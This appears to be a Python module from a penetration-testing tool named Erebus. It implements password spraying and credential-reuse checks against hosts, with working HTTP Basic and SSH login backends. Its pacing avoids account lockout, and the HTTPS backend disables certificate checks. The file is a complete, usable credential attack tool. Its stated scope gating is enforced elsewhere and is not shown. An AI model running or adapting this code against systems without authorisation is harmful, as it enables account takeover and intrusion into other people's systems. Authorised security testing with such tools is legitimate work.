"""Scope-gated active credential attacks: password spray and credential reuse.

These are the only *active* credential techniques Erebus performs - they make
authentication attempts against hosts the runner has already scope-checked
(RHOSTS). The orchestration is network-agnostic: an ``attempt`` callable does the
actual auth, so spray/reuse logic is fully unit-tested without touching a host.
Two built-in backends ship: http-basic (stdlib) and ssh (needs paramiko).

Lockout-safety is built in: spraying tries ONE password across all users, then
pauses, then the next password - never many passwords at one account in a burst.
"""
from __future__ import annotations

import base64
import http.client
import ssl
import time
from typing import Any, Callable

# (host, port, username, secret) -> True if authentication was accepted
Attempt = Callable[[str, int, str, str], bool]


class CredAttackError(RuntimeError):
    """A backend could not run (e.g. a missing optional dependency)."""


def http_basic_attempt(host: str, port: int, username: str, secret: str, *,
                       scheme: str = "http", path: str = "/",
                       timeout: float = 6.0) -> bool:
    """True if HTTP Basic auth to a protected path is accepted (not 401/403)."""
    token = base64.b64encode(f"{username}:{secret}".encode()).decode()
    headers = {"Authorization": f"Basic {token}", "User-Agent": "erebus-creds/1"}
    conn: http.client.HTTPConnection
    if scheme == "https":
        conn = http.client.HTTPSConnection(host, port, timeout=timeout,
                                           context=ssl._create_unverified_context())
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path or "/", headers=headers)
        status = conn.getresponse().status
    except (OSError, http.client.HTTPException):
        return False
    finally:
        conn.close()
    return status not in (401, 403) and status < 500


def ssh_attempt(host: str, port: int, username: str, secret: str, *,
                timeout: float = 6.0) -> bool:
    """True if SSH password auth is accepted. Requires paramiko (pip install paramiko)."""
    try:
        import paramiko  # type: ignore[import-untyped]
    except ImportError as exc:  # pragma: no cover - depends on optional dep
        raise CredAttackError(
            "ssh backend needs paramiko - install it (pip install paramiko)") from exc
    client = paramiko.SSHClient()  # pragma: no cover - needs a live host
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port or 22, username=username, password=secret,
                       timeout=timeout, allow_agent=False, look_for_keys=False)
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:  # noqa: BLE001 - network/proto errors = not accepted
        return False
    finally:
        client.close()


def spray(hosts: list, users: list, passwords: list, attempt: Attempt, *,
          port: int = 0, delay: float = 0.0, per_user_stop: bool = True,
          sleep: Callable[[float], None] = time.sleep) -> list:
    """Password-spray: for each password, try it against every user on every host.

    One password per round across all accounts, then ``delay`` - lockout-safe.
    Returns a list of accepted {host, port, username, secret}. ``per_user_stop``
    skips a user once a valid password is found for them (per host)."""
    hits: list = []
    found: set = set()  # (host, user) already cracked
    for i, pw in enumerate(passwords):
        for host in hosts:
            for user in users:
                if per_user_stop and (host, user) in found:
                    continue
                if attempt(host, port, user, pw):
                    hits.append({"host": host, "port": port, "username": user,
                                 "secret": pw})
                    found.add((host, user))
        if delay and i < len(passwords) - 1:
            sleep(delay)
    return hits


def check_reuse(creds: list, hosts: list, attempt: Attempt, *, port: int = 0,
                delay: float = 0.0, sleep: Callable[[float], None] = time.sleep) -> list:
    """Try each known (username, secret) against each host; return accepted hits.

    ``creds`` is a list of dicts with 'username' and 'secret'. A hit is only
    reported for a (host, user) pair not already paired with that secret."""
    hits: list = []
    seen: set = set()
    for n, cred in enumerate(creds):
        user = str(cred.get("username") or "")
        secret = str(cred.get("secret") or "")
        if not user:
            continue
        for host in hosts:
            key = (host, user, secret)
            if key in seen:
                continue
            seen.add(key)
            if attempt(host, port, user, secret):
                hits.append({"host": host, "port": port, "username": user,
                             "secret": secret})
        if delay and n < len(creds) - 1:
            sleep(delay)
    return hits


def parse_list(value: Any) -> list:
    """A comma/space/newline-separated option into a clean list of strings."""
    if not value:
        return []
    text = str(value)
    out: list = []
    for chunk in text.replace(",", " ").replace("\n", " ").split():
        c = chunk.strip()
        if c and c not in out:
            out.append(c)
    return out
